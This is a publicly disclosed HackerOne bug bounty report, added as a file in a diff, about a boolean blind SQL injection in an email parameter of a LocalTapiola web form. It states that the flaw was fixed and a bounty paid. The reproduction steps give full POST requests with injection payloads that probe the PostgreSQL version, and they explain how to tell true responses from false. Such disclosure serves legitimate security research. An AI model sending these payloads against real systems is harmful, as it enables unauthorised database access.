@@ -1,0 +1,94 @@
+ReportLink:https://hackerone.com/reports/191146
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/sandh0t
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:1350.0
+Severity:medium
+State:Closed
+DateOfDisclosure:25.01.2017 0:21:10
+
+Summary:
+##Issue
+
+The reporter found a response based SQL Injection attack in an application in viestinta.lahitapiola.fi.
+
+##Fix
+
+The issue was investigated and found to be valid. The fix was to sanitize the parameters in the application.
+
+##Reasoning
+
+The reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. 
+## Basic report information
+**Summary:**
+
+Hi,
+The  **ctx[vars][email]** parameter in **http://viestinta.lahitapiola.fi/webApp/lapsuudenturva**, can be exploited to perform an SQL Injection Attack.
+
+The parameter is **ctx[vars][email]**
+
+**Description:**
+
+The value inside the ctx tag <email></email>, doesn't properly sanitized to user input, it can be exploited to perform a **Boolean Blind SQL Injection**  Attack.
+
+You can differentiate a response with a **True** SQL Statement and **False** one, by the looking of this string **"Adform Tracking Code BEGIN"**.
+
+A **True** SQL Statement will contain the **"Adform Tracking Code BEGIN"** strings, while  a **False** one will not.
+
+**Domain:** 
+viestinta.lahitapiola.fi
+
+## Browsers / Apps Verified In:
+
+  All Browsers
+
+## Steps To Reproduce:
+
+  1. For a True response use this payload: **' and substr(version(),1,10) = 'PostgreSQL' and '1**
+
+```
+
+POST /webApp/lapsuudenturva HTTP/1.1
+Host: viestinta.lahitapiola.fi
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://viestinta.lahitapiola.fi/webApp/lapsuudenturva
+Cookie: _ga=GA1.3.2035133005.1481717157; _ga=GA1.2.2035133005.1481717157; vlmref=128248795816721230; _gat=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1215
+
+interest-lapsen-vakavan-sairauden-vakuutus=1&etunimi=aaaa&sukunimi=zzzz&puhelinnumero=00236556566&sahkoposti=hman%40opmail.com&postinumero=00125&postitoimipaikka=aaaa&ctx=<ctx lang="en" _target="web" webApp-id="48590459" _folderModel="nmsRecipient"><userInfo datakitInDatabase="true" homeDir="" instanceLocale="en-US" locale="en-US" login="webapp" loginCS="Web applications agent (webapp)" loginId="3290" noConsoleCnx="true" orgUnitId="0" theme="" timezone="Europe/Helsinki" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:xtk:session" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right right="admin"/></userInfo><timezone current="Europe/Helsinki" changed="false"/><vars><savings>0</savings><accident>0</accident><child>0</child><seriousIllness>1</seriousIllness><contacted>0</contacted><firstName>aaaa</firstName><lastName>zzzz</lastName><mobilePhone>00236556566</mobilePhone><email>hman@opmail.com' and substr(version(),1,10) = 'PostgreSQL' and '1</email><postalCode>00125</postalCode><city>aaaa</city></vars><activityHistory><activity name="page2"/><activity name="start"/></activityHistory></ctx>&userAction=next&transition=
+``` 
+  2.  For a False response use this payload as example: ' and substr(version(),1,11) = 'PostgreSQL' and '1
+
+```
+
+POST /webApp/lapsuudenturva HTTP/1.1
+Host: viestinta.lahitapiola.fi
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://viestinta.lahitapiola.fi/webApp/lapsuudenturva
+Cookie: _ga=GA1.3.2035133005.1481717157; _ga=GA1.2.2035133005.1481717157; vlmref=128248795816721230; _gat=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1215
+
+interest-lapsen-vakavan-sairauden-vakuutus=1&etunimi=aaaa&sukunimi=zzzz&puhelinnumero=00236556566&sahkoposti=hman%40opmail.com&postinumero=00125&postitoimipaikka=aaaa&ctx=<ctx lang="en" _target="web" webApp-id="48590459" _folderModel="nmsRecipient"><userInfo datakitInDatabase="true" homeDir="" instanceLocale="en-US" locale="en-US" login="webapp" loginCS="Web applications agent (webapp)" loginId="3290" noConsoleCnx="true" orgUnitId="0" theme="" timezone="Europe/Helsinki" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:xtk:session" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><login-right right="admin"/></userInfo><timezone current="Europe/Helsinki" changed="false"/><vars><savings>0</savings><accident>0</accident><child>0</child><seriousIllness>1</seriousIllness><contacted>0</contacted><firstName>aaaa</firstName><lastName>zzzz</lastName><mobilePhone>00236556566</mobilePhone><email>hman@opmail.com' and substr(version(),1,11) = 'PostgreSQL' and '1</email><postalCode>00125</postalCode><city>aaaa</city></vars><activityHistory><activity name="page2"/><activity name="start"/></activityHistory></ctx>&userAction=next&transition=
+
+```
+
+
+## Additional material
+
+  See Attached POC
+
+## Related reports, best practices
+
+  * [OWASP-recommendations]
